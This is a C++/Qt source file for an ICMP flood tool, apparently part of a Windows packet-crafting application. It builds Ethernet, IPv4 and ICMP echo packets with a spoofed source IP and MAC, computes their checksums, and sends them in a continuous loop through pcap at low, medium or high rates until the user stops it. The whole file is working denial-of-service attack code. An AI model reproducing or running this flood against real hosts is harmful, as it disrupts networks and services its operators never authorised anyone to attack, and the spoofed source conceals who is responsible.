#include "icmpflood.h"
#include "ui_icmpflood.h"
#include <QRegExpValidator>
#include "capthread.h"
#include "windows.h"

#include <QDebug>

IcmpFlood::IcmpFlood(QWidget *parent, QString nicName, QString nicIP) :
    QWidget(parent),
    ui(new Ui::IcmpFlood)
{
    ui->setupUi(this);
    this->nicName = nicName;
    this->nicIP = nicIP;

    ui->nicName->setText(this->nicIP);

    /* 设置IP地址格式 */
    QRegExp ipRx("^((2[0-4]\\d|25[0-5]|[01]?\\d\\d?)\\.){3}(2[0-4]\\d|25[0-5]|[01]?\\d\\d?)$");
    QRegExpValidator* IPValidator = new QRegExpValidator(ipRx);
    ui->targetIP->setValidator(IPValidator);
    ui->fakeIP->setValidator(IPValidator);
    QRegExp macRx("([0-9A-F]{2}-[0-9A-F]{2}-[0-9A-F]{2}-[0-9A-F]{2}-[0-9A-F]{2}-[0-9A-F]{2})");
    QRegExpValidator* macValidator = new QRegExpValidator(macRx);
    ui->targetMAC->setValidator(macValidator);
    ui->fakeMAC->setValidator(macValidator);
    ui->fakeIP->setEnabled(true);

    /* 设置按钮组 */
    ui->fakeFlood->setChecked(true);

    btnGroup = new QButtonGroup(this);
    btnGroup->addButton(ui->fakeFlood, 0);
    connect(ui->fakeFlood, &QRadioButton::clicked, this, &IcmpFlood::onRadioBtnChecked);

    /* 速率组 */
    rateGroup = new QButtonGroup(this);
    rateGroup->addButton(ui->lowRate, 0);
    rateGroup->addButton(ui->midRate, 1);
    rateGroup->addButton(ui->highRate, 2);
    ui->midRate->setChecked(true);

    /* 开始发送 */
    connect(ui->startBtn, &QPushButton::clicked, [=](){
        /* 判断输入内容 */
        if(ui->targetIP->text().size()<7 || ui->targetMAC->text().size() < 17 ||
                (mode == 1 && (ui->fakeIP->text().size()<7 ||ui->fakeMAC->text().size()<7 ))){
            ui->icmpResult->append("Wrong input! Check again!");
        }else{
            ui->startBtn->setEnabled(false);
            ui->stopBtn->setEnabled(true);
            keepSend = true;
            switch(btnGroup->checkedId()){
            case 0:
                std::thread t(&IcmpFlood::fakeIpIcmpFlood, this);
                t.detach();
                break;
                /* Other Mode */
            }
        }
    });

    /* 停止发送 */
    connect(ui->stopBtn, &QPushButton::clicked, [=](){
        ui->startBtn->setEnabled(true);
        ui->stopBtn->setEnabled(false);
        keepSend = false;
    });

    /* Textedit添加文本 */
    connect(this, &IcmpFlood::sendText, this, &IcmpFlood::addText);
}

IcmpFlood::~IcmpFlood()
{
    delete ui;
}

void IcmpFlood::addText(QString text)
{
    ui->icmpResult->append(text);
}

void IcmpFlood::onRadioBtnChecked()
{
    switch (btnGroup->checkedId()) {
    case 0:
        ui->fakeIP->setEnabled(true);
        mode = 0;
        break;
    }
}

//void IcmpFlood::directIcmpFlood()
//{
//    char errbuf[PCAP_ERRBUF_SIZE];
//    u_char packet[74];
//    QStringList targetIPlist = ui->targetIP->text().split(".");
//}

u_short get_ip_checksum(char* ip_hdr)
{
    char* ptr_data = ip_hdr;
    u_long  tmp = 0;
    u_long  sum = 0;
    for (int i=0; i<20; i+=2)
    {
        tmp += (u_char)ptr_data[i] << 8;
        tmp += (u_char)ptr_data[i+1];
        sum += tmp;
        tmp = 0;
    }
    u_short lWord = sum & 0x0000FFFF;
    u_short hWord = sum >> 16;
    u_short checksum = lWord + hWord;
    checksum = ~checksum;
    return checksum;
}

ushort get_icmp_checksum(ushort *buffer,int size)
{
    unsigned long cksum=0;
    //将数据以字为单位累加到CKSUM中
    while(size>1)
    {
        cksum+=*buffer++;
        size-=sizeof(ushort);
    }
    //如果为奇数，将最后一个字节扩展到双字，再累加到cksum中
    if(size)
    {
        cksum+=*(uchar *)buffer;
    }
    //将cksum的高16位和低16位相加，取反后得到校验和
    cksum=(cksum>>16)+(cksum&0xffff);
    cksum+=(cksum>>16);
    return (ushort)(~cksum);

}

void IcmpFlood::fakeIpIcmpFlood()
{
    char errbuf[PCAP_ERRBUF_SIZE];
    u_char packet[42];
    ushort id = 0x0000;
    ulong sendRate;
    ulong rate[3] = {50, 20, 2};
    QString rateStr[3] = {"Low", "Medium", "High"};

    emit sendText("  **** Start ****");
    emit sendText("Packet Rate: " + rateStr[rateGroup->checkedId()]);

    QStringList targetIPlist = ui->targetIP->text().split(".");
    QStringList targetMAClist = ui->targetMAC->text().split("-");
    QStringList fakeIPlist = ui->fakeIP->text().split(".");
    QStringList fakeMAClist = ui->fakeMAC->text().split("-");

    /* 设置以太网帧 */
    eth_header eth;
    for(int i = 0;i<6;i++){
        eth.src[i] = static_cast<uchar>(fakeMAClist[i].toInt(nullptr, 16));
        eth.dest[i] = static_cast<uchar>(targetMAClist[i].toInt(nullptr, 16));
    }

    eth.type = htons(0x0800);
    memcpy(packet, &eth, sizeof (eth));

    /* IPv4 */
    ip_header ipv4;
    ipv4.ihl = 5;ipv4.version = 4;
    ipv4.tos = 0x00;ipv4.tlen = htons(28);
    ipv4.id = htons(id);ipv4.frag_off = 0x0000;
    ipv4.ttl = 64;ipv4.proto = 1;
    ipv4.check = 0;
    for(int i =0;i<4;i++){
        ipv4.saddr[i] = static_cast<uchar>(fakeIPlist[i].toInt());
        ipv4.daddr[i] = static_cast<uchar>(targetIPlist[i].toInt());
    }

    /* 计算IPv4校验和 */
    ipv4.check = htons(get_ip_checksum((char*)&ipv4));

    memcpy(&packet[14], &ipv4, 20);

    /* ICMP头部 */
    icmp_header icmp;
    icmp.type = 0x08;
    icmp.code = 0;
    icmp.checksum = 0;
    icmp.id = htons(0x0001);
    icmp.seq = htons(id);

    icmp.checksum = get_icmp_checksum((ushort*)&icmp, sizeof(icmp));

    memcpy(&packet[34], &icmp, 8);

    if ((fp= pcap_open(nicName.toLocal8Bit().data(),          // 设备名
                       65536,            // 65535保证能捕获到不同数据链路层上的每个数据包的全部内容
                       PCAP_OPENFLAG_PROMISCUOUS,    // 混杂模式
                       1000,             // 读取超时时间
                       nullptr,             // 远程机器验证
                       errbuf            // 错误缓冲池
                       )) == nullptr)
    {
        emit sendText("Error when open the adapter.");
    }


    sendRate = rate[rateGroup->checkedId()];
    /* 发送数据包 */
    int count = 100;
    while(keepSend){
        if(count == 0){
            emit sendText("- 100 ICMP Packet sent.");
            count = 100;
        }
        if (pcap_sendpacket(fp, packet, 42 /* size */) != 0)
        {
            emit sendText("Error sending the ICMP packet.");
        }
        count--;
        Sleep(sendRate);
    }
    emit sendText("  **** Stop ****");
    pcap_close(fp);

}
